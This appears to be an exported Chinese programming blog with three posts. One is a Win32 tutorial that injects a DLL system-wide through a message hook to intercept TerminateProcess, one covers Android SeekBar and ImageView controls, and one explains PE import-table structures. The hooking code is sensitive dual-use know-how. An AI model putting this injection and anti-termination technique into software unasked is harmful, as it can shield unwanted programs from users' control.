<h2 id="DLL模块的编写"><a href="#DLL模块的编写" class="headerlink" title="DLL模块的编写"></a>DLL模块的编写</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ProcessHook.cpp : 定义 DLL 应用程序的导出函数。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"CAPIHook.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> CAPIHook g_TerminateProcess;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">Hook_TerminateProcess</span><span class="params">(HANDLE hProcess,UINT uExitCode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFNTERMINATEPROCESS)</span><span class="params">(HANDLE ,UINT)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> szPathName[MAX_PATH];</span><br><span class="line">	GetModuleFileName(<span class="literal">NULL</span>,szPathName,MAX_PATH);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> sz[<span class="number">2048</span>];</span><br><span class="line">	wsprintf(sz,<span class="string">"\r\n 进程:(%d) %s \r\n\r\n 进程句柄: %X\r\n退出代码: %d"</span>,GetCurrentProcessId(),szPathName,hProcess,uExitCode);</span><br><span class="line"></span><br><span class="line">	COPYDATASTRUCT cds = &#123;GetCurrentProcessId(),<span class="built_in">strlen</span>(sz)<span class="number">-1</span>,sz&#125;;</span><br><span class="line">	<span class="keyword">if</span> (::SendMessage(FindWindow(<span class="literal">NULL</span>,<span class="string">"ProcessProtect"</span>),WM_COPYDATA,<span class="number">0</span>,(LPARAM)&amp;cds) != <span class="number">-1</span>)</span><br><span class="line">		<span class="keyword">return</span> ((PFNTERMINATEPROCESS)(PROC)g_TerminateProcess)(hProcess,uExitCode);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">CAPIHook <span class="title">g_TerminateProcess</span><span class="params">(<span class="string">"kernel32.dll"</span>,<span class="string">"TerminateProcess"</span>,(PROC)Hook_TerminateProcess)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"Wker"</span>)</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> HMODULE <span class="title">ModuleFromAddress</span><span class="params">(PVOID pv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mbi;</span><br><span class="line">	<span class="keyword">if</span> (VirtualQuery(pv,&amp;mbi,<span class="keyword">sizeof</span>(mbi)) != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (HMODULE)mbi.AllocationBase;</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMsgProc</span><span class="params">(  <span class="keyword">int</span> code,       <span class="comment">// hook code</span></span></span></span><br><span class="line"><span class="function"><span class="params">	WPARAM wParam,  <span class="comment">// removal flag</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPARAM lParam   <span class="comment">// address of structure with message</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook,code,wParam,lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">SetSysHook</span><span class="params">(BOOL bInstall,DWORD dwThread)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bOk;</span><br><span class="line">	<span class="keyword">if</span> (bInstall)</span><br><span class="line">	&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_GETMESSAGE,GetMsgProc,ModuleFromAddress(GetMsgProc),dwThread);</span><br><span class="line">		bOk = (g_hHook != <span class="literal">NULL</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		bOk = UnhookWindowsHookEx(g_hHook);</span><br><span class="line">		g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> bOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先这个extern我不太明白，但是根据我的感觉就是说使用这个变量<code>g_TerminateProcess</code>我们要遵守这个变量的一些命名规范，只有这样我们下面的强制转换才能返回我们的origin。</p>
<p>我们先定义我们自己的TerminateProcess，先将这个函数的原型定义出来，然后获取模块名称，然后配置字符串，下面这个之前没用到过，<code>COPYDATASTRUCT</code>这个就是一个数据传输的结构体：“其中dwData为32位的自定义数据， lpData为指向数据的指针，cbData为lpData指针指向数据的大小（字节数）。”从网上看到的，其实就是用来传送数据的，主要最后一个参数，我们将我们的字符串放进去就好。然后再给我们的窗口发消息，这个窗口是我们必须定义好的，如果SendMessage返回给我们-1，就是放行，我们就正常执行，这里可以看到使用了强制转换，(PROC)我们将会得到原先函数的地址，然后将这个PROC强制转换成我们的这个函数的原型，然后再调用就好了。</p>
<p>我们声明我们的全局变量，因为全局，所以一加载我们就会创建，这种感觉就好像MFC和安卓的那种感觉，在构造函数里写过程。<br>然后定义一个数据段，名字为”Wker”，将我们的钩子句柄放进去，下面就基本一样了，只不过我们在消息那里我们什么也不做，这里放钩子只是为了注入DLL，因为Message在可视化应用程序中基本都有。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">	SetSysHook</span><br><span class="line"></span><br><span class="line">SECTIONS</span><br><span class="line">	Wker Read Write Shared</span><br></pre></td></tr></table></figure>
<p>导出配置就和之前一样。</p>
<h2 id="主程序编写"><a href="#主程序编写" class="headerlink" title="主程序编写"></a>主程序编写</h2><p>这个主程序就很简单了，有了DLL就好说了。<br>首先我们先把钩子函数给完善起来。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">pSetSysHook</span><span class="params">(BOOL bInstall,DWORD dwThread = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span> <span class="params">(WINAPI *PFNSETSYSHOOK)</span><span class="params">(BOOL,DWORD)</span></span>;</span><br><span class="line">	<span class="keyword">char</span> szDll[] = <span class="string">"ProcessHook.dll"</span>;</span><br><span class="line">	BOOL bNeedFree = FALSE;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(szDll);</span><br><span class="line">	<span class="keyword">if</span> (hModule == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		hModule = LoadLibrary(szDll);</span><br><span class="line">		bNeedFree = TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	PFNSETSYSHOOK mSetSysHook = (PFNSETSYSHOOK)GetProcAddress(hModule,<span class="string">"SetSysHook"</span>);</span><br><span class="line">	<span class="keyword">if</span> (mSetSysHook == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(bNeedFree)</span><br><span class="line">			FreeLibrary(hModule);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	BOOL bRet = mSetSysHook(bInstall,dwThread);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(bNeedFree)</span><br><span class="line">		FreeLibrary(hModule);</span><br><span class="line">	<span class="keyword">return</span> bRet;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>就是和之前一样，但是我们这个是动态加载的，我们是先看看加没加载，加载了的话呢我们就不用了再LoadLibrary了，也就是我们要释放了。</p>
<p>消息处理：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CProcessProtectDlg::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct)</span><br><span class="line">&#123;</span><br><span class="line">	m_HookList.AddString((<span class="keyword">char</span> *)pCopyDataStruct-&gt;lpData);</span><br><span class="line">	BOOL bForBid = ((CButton*)GetDlgItem(IDC_FORBIDEXE))-&gt;GetCheck();</span><br><span class="line">	<span class="keyword">if</span>(bForBid)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">	<span class="comment">//return CDialogEx::OnCopyData(pWnd, pCopyDataStruct);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个消息处理也比较简单就一个强制转换，但是返回值需要注意，这个返回值是确定我们是不是要关闭程序的，连接在DLL那一边的。</p>
<p>初始化窗口的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!pSetSysHook(TRUE,<span class="number">0</span>))</span><br><span class="line">	MessageBox(<span class="string">"钩子加载失败"</span>);</span><br></pre></td></tr></table></figure>
<p>销毁窗口的时候：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CProcessProtectDlg::OnDestroy()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnDestroy();</span><br><span class="line"></span><br><span class="line">	pSetSysHook(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也是比较简单的。</p>
<h2 id="程序跟踪"><a href="#程序跟踪" class="headerlink" title="程序跟踪"></a>程序跟踪</h2><p>首先我们先用OD加载程序（加载的是关闭程序的）<br>首先先看我们的程序原先的函数定义位置为：<br><img src="img2.jpg" alt="函数地址"><br>当我们程序加载进来的时候：<br><img src="img3.jpg" alt="DLL加载"><br>我们可以看到DLL成功加载，当然这里我是为了方便，用OD加载的，程序也是一样的。<br>再看我们的函数地址：<br><img src="img4.jpg" alt="函数地址"><br>我们跳过去看一下。<br><img src="img5.jpg" alt="函数程序块"><br>可以看到就是我们的函数，而且确实是在我们的DLL领空。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android进度条和图像控件</title>
    <url>/2020/02/06/Android%E8%BF%9B%E5%BA%A6%E6%9D%A1%E5%92%8C%E5%9B%BE%E5%83%8F%E6%8E%A7%E4%BB%B6/</url>
    <content><![CDATA[<h2 id="进度条控件"><a href="#进度条控件" class="headerlink" title="进度条控件"></a>进度条控件</h2><p>这个相对比较简单，常用的就是开始拖动，停止拖动，进度改变这三个监听器。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;SeekBar</span><br><span class="line">    android:id=<span class="string">"@+id/seekBar1"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">    android:layout_alignParentTop=<span class="string">"true"</span></span><br><span class="line">    android:layout_centerHorizontal=<span class="string">"true"</span></span><br><span class="line">    android:layout_marginTop=<span class="string">"71dp"</span></span><br><span class="line">    android:progress=<span class="string">"60"</span></span><br><span class="line">    android:secondaryProgress=<span class="string">"80"</span> /&gt;</span><br></pre></td></tr></table></figure>
<ol>
<li>progress是显示的进度</li>
<li>secondaryProgress是二层显示的一个进度，颜色是虚的</li>
</ol>
<p>常用方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">	Sb_One.setOnSeekBarChangeListener(<span class="keyword">new</span> OnSeekBarChangeListener() &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//停止拖动</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStopTrackingTouch</span><span class="params">(SeekBar seekBar)</span> </span>&#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">			Log.d(<span class="string">"SeekBar_Stop"</span>, <span class="string">"Stop"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//开始拖动</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onStartTrackingTouch</span><span class="params">(SeekBar seekBar)</span> </span>&#123;</span><br><span class="line">			Log.d(<span class="string">"SeekBar_Start"</span>, <span class="string">"Start"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//进度值改变</span></span><br><span class="line">		<span class="meta">@Override</span></span><br><span class="line">		<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(SeekBar seekBar, <span class="keyword">int</span> progress, <span class="keyword">boolean</span> fromUser)</span> </span>&#123;</span><br><span class="line">			Log.d(<span class="string">"SeekBar_Progress"</span>, progress+<span class="string">""</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图像控件"><a href="#图像控件" class="headerlink" title="图像控件"></a>图像控件</h2><p>就是显示图片的一个东西，但因为是显示图片，所以他的属性有点多，而且有点乱，感觉就是用到的时候在去查询就可以了。</p>
<h3 id="常见属性"><a href="#常见属性" class="headerlink" title="常见属性"></a>常见属性</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/seekBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/seekBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"29dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@android:color/darker_gray"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:maxHeight</span>=<span class="string">"300dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:maxWidth</span>=<span class="string">"300dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:adjustViewBounds</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>adjustViewBounds：这个看名字就知道就是一个是否自动调整和图像一样，这个是和maxHeight与maxWidth一起才有效果的，也是必须和他们一起。</li>
<li><code>android:scaleType=&quot;fitXY&quot;</code>这个上面XML没写，但是也是比较常用，有下面几个值可以供我们选择：</li>
</ol>
<table>
<thead>
<tr>
<th>值</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>fitXY</td>
<td>拉伸图片（不按比例）以填充View的宽高</td>
</tr>
<tr>
<td>fitStart</td>
<td>按比例拉伸图片，拉伸后图片的高度为View的高度，且显示在View的左边</td>
</tr>
<tr>
<td>fitCenter</td>
<td>按比例拉伸图片，拉伸后图片的高度为View的高度，且显示在View的中间</td>
</tr>
<tr>
<td>fitEnd</td>
<td>按比例拉伸图片，拉伸后图片的高度为View的高度，且显示在View的右边</td>
</tr>
<tr>
<td>center</td>
<td>按原图大小显示图片，但图片宽高大于View的宽高时，截图图片中间部分显示</td>
</tr>
<tr>
<td>centerCrop</td>
<td>按比例放大原图直至等于某边View的宽高显示。</td>
</tr>
<tr>
<td>centerInside</td>
<td>当原图宽高或等于View的宽高时，按原图大小居中显示；反之将原图缩放至View的宽高居中显示。</td>
</tr>
</tbody></table>
<p>这个东西就是这么看看用到的时候进行选择就可以了。但是需要注意的是使用scaleType这个属性我们宽高不要设置为：wrap_content包裹内容，否则看不出效果。</p>
<h3 id="缩放与旋转"><a href="#缩放与旋转" class="headerlink" title="缩放与旋转"></a>缩放与旋转</h3><p>我们通过进度条进行实现，这个东西用到了一个矩阵类，这个类呢，我也没怎么研究过，但是使用起来就是用到他一个设置轮值的方法，也就是旋转度的一个方法。<br>首先我们先配置XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SeekBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/seekBar2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/imageView1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_centerHorizontal</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:progress</span>=<span class="string">"60"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:secondaryProgress</span>=<span class="string">"80"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SeekBar</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/seekBar1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/seekBar2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_centerHorizontal</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:progress</span>=<span class="string">"60"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:secondaryProgress</span>=<span class="string">"80"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/imageView1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"300dip"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/seekBar2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignParentTop</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"19dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:scaleType</span>=<span class="string">"fitCenter"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:src</span>=<span class="string">"@drawable/ic_launcher"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>（在写这个博客的时候解决了一个问题啊哈哈哈！本来还想之后再补上）</p>
<p>先设置那个进度条的大小：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DisplayMetrics dm = <span class="keyword">new</span> DisplayMetrics();</span><br><span class="line">getWindowManager().getDefaultDisplay().getMetrics(dm);<span class="comment">//获取屏幕属性</span></span><br><span class="line">Sb_One.setMax(dm.widthPixels);</span><br></pre></td></tr></table></figure>
<p>设置完进度条之后，我么来编写放大缩小。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(SeekBar seekBar, <span class="keyword">int</span> progress, <span class="keyword">boolean</span> fromUser)</span> </span>&#123;</span><br><span class="line">	im_One.setLayoutParams(<span class="keyword">new</span> RelativeLayout.LayoutParams(progress,progress*<span class="number">3</span>/<span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一些累赘的代码我就没copy上去，单子啊这里需要注意要用到我们当前布局下面的LayoutParams生成的类才可以。<br>旋转的实现我们先new一个矩阵类：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">private Matrix ma;</span><br><span class="line">/*...*/</span><br><span class="line">ma = new Matrix();</span><br></pre></td></tr></table></figure>
<p>之后我们再在第二个的拖动事件里面写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(SeekBar seekBar, <span class="keyword">int</span> progress, <span class="keyword">boolean</span> fromUser)</span> </span>&#123;</span><br><span class="line">	ma.setRotate(progress);	</span><br><span class="line">	Bitmap bit = ((BitmapDrawable)getResources().getDrawable(R.drawable.ic_launcher)).getBitmap();</span><br><span class="line">	bit = Bitmap.createBitmap(bit,<span class="number">0</span>,<span class="number">0</span>,bit.getWidth(),bit.getHeight(),ma,<span class="keyword">true</span>);</span><br><span class="line">	im_One.setImageBitmap(bit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先显示设置轮值，然后再获取我们的Bitmap对象，然后创建一幅新的位图，矩阵信息用我们设置过轮值的，然后再设置图片就好了。<br><img src="img1.jpg" alt="效果图"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>导入表的获取</title>
    <url>/2020/02/06/%E5%AF%BC%E5%85%A5%E8%A1%A8%E7%9A%84%E8%8E%B7%E5%8F%96/</url>
    <content><![CDATA[<h1 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h1><p>百度百科：</p>
<hr>
<p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中.当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p>
<hr>
<p>其实简单的说就是你这个程序用了哪些DLL，用了这个DLL的名称和DLL地址是在哪个地方，都在这里有说明。</p>
<h2 id="获取导入表"><a href="#获取导入表" class="headerlink" title="获取导入表"></a>获取导入表</h2><p>首先是<code>GetModuleHandle</code>这个函数，以前用的时候只知道返回一个句柄，但现在看来好像不是那么简单，这个句柄应该就是一个地址，就是程序的一个起始地址（不是函数的入口点，就是开头是MZ的那个，下面会说到）。<br>通过这个函数我们获得内存中镜像的一个地址之后，我们就可以获取IAT（导出表）了，通过PE结构。<br>首先还是要看下比较重要的几个结构体。</p>
<h3 id="IMAGE-DOS-HEADER"><a href="#IMAGE-DOS-HEADER" class="headerlink" title="IMAGE_DOS_HEADER"></a>IMAGE_DOS_HEADER</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> &#123;</span>      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br></pre></td></tr></table></figure>
<p>这个之前博客说过，就是用来获取PE头文件的，简单看下就好。</p>
<h3 id="IMAGE-OPTIONAL-HEADER"><a href="#IMAGE-OPTIONAL-HEADER" class="headerlink" title="IMAGE_OPTIONAL_HEADER"></a>IMAGE_OPTIONAL_HEADER</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>
<p>这里我这个是Win32的所以，宏定义我就到这里来了。里面包含的就是一些模块的、代码的的基地址，还有些线程堆栈之类的一些信息。</p>
<h3 id="IMAGE-IMPORT-DESCRIPTOR"><a href="#IMAGE-IMPORT-DESCRIPTOR" class="headerlink" title="IMAGE_IMPORT_DESCRIPTOR"></a>IMAGE_IMPORT_DESCRIPTOR</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p>这个就是比较重要的导出表关键结构体。</p>
<ol>
<li>OriginalFirstThunk：（函数序号名称）表的偏移量，导入函数的名称</li>
<li>Name：导入模块名称字符串的偏移量</li>
<li>FirstThunk：IAT导入表的一个偏移量，导入函数的地址</li>
